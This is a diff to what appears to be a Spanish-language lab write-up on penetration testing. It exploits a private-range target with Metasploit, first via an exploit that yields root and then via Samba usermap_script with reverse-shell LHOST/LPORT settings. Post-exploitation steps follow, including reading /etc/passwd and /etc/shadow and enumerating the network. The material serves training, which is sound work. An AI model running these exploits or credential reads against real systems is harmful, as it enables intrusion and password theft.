@@ -56,8 +56,76 @@ para que el exploit funcione. Use show options para ver qué parámetros son nec
 <img width="725" height="87" alt="image" src="https://github.com/user-attachments/assets/4f22e31f-0ebf-4495-b019-f31276e1cecb" />
 
 set RHOSTS 192.168.56.102
-exploit
+# exploit
 <img width="913" height="402" alt="image" src="https://github.com/user-attachments/assets/c7a7466a-2c9e-4c61-baf3-88cfce6096be" />
+# comandos de Linux para verificar su acceso y privilegios:
+<img width="355" height="142" alt="image" src="https://github.com/user-attachments/assets/a6a170dd-fc7f-46a7-9cef-b05434729af7" />
+Resultado: Se obtuvo acceso remoto con privilegios de superusuario (root) de forma inmediata, sin necesidad de realizar escalada de privilegios posterior.
+<img width="692" height="606" alt="image" src="https://github.com/user-attachments/assets/eeeb0a75-89d7-4b70-922c-3e8615f57bbe" />
+
+# 6.3.2 Explotación de Samba usermap script
+
+# Buscar el Exploit Apropiado: Si aún está en la sesión de Metasploit, puede salir de la shell actual escribiendo exit y luego buscar el nuevo exploit:
+Comando: search samba usermap script
+<img width="1017" height="193" alt="image" src="https://github.com/user-attachments/assets/676c16ff-711d-44d8-80d3-05602b095b0f" />
+# use exploit/multi/samba/usermap_script
+# show options
+<img width="1015" height="532" alt="image" src="https://github.com/user-attachments/assets/45b58ed3-4a29-4a8a-9061-b4afc48a3b74" />
+# show options
+set LHOST 192.168.X.Z # IP de Kali Linux
+set LPORT 4444 # Puerto de escucha en Kali
+<img width="1033" height="478" alt="image" src="https://github.com/user-attachments/assets/23974f76-a855-43ba-b3a7-639a4ba1f06b" />
+<img width="981" height="115" alt="image" src="https://github.com/user-attachments/assets/b7cb2d59-161f-42b2-9149-e591f08d2997" />
+
+
+# 6.4 Post-Explotación Detallada
+Verificar Usuario Actual y Privilegios: 
+- Confirme que tiene privilegios de root (uid=0).
+- Información del Sistema Operativo:
+- <img width="432" height="82" alt="image" src="https://github.com/user-attachments/assets/c4cbdf89-861d-40af-9d20-55556c8f8f9f" />
+uname -a # Información del kernel y arquitectura
+cat /etc/os-release # Detalles de la distribución Linux
+cat /etc/issue # Información de la versión del sistema
+<img width="976" height="310" alt="image" src="https://github.com/user-attachments/assets/06b525f5-26b0-4775-9a1b-5d79e8c111d5" />
+
+# ifconfig -a # Todas las interfaces de red
+<img width="728" height="507" alt="image" src="https://github.com/user-attachments/assets/14effc8d-9f3b-44f4-9ae8-ce1ff88e5776" />
+
+# ip a # Alternativa a ifconfig
+<img width="767" height="195" alt="image" src="https://github.com/user-attachments/assets/92538ac9-9e02-488b-a1bf-85de558fb3b9" />
+
+# netstat -tulnp # Puertos abiertos y servicios escuchando (requiere root)
+<img width="878" height="828" alt="image" src="https://github.com/user-attachments/assets/36e16db2-8e24-466c-8c9b-389468436e7f" />
+# netstat -antp # Conexiones TCP y UDP activas (requiere root)
+<img width="917" height="823" alt="image" src="https://github.com/user-attachments/assets/ff4de5a4-ca2a-4052-8dbe-4fb67da26470" />
+# route -n # Tabla de enrutamiento
+<img width="782" height="96" alt="image" src="https://github.com/user-attachments/assets/b3e88398-a852-4a86-a8c2-727005c62bbe" />
+# - Usuarios y Grupos del Sistema:
+cat /etc/passwd # Lista de usuarios del sistema
+cat /etc/shadow # Contraseñas hasheadas (solo legible por root)
+cat /etc/group # Grupos del sistema
+<img width="642" height="818" alt="image" src="https://github.com/user-attachments/assets/65c21406-f75b-41a8-97e3-355c7941d062" />
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
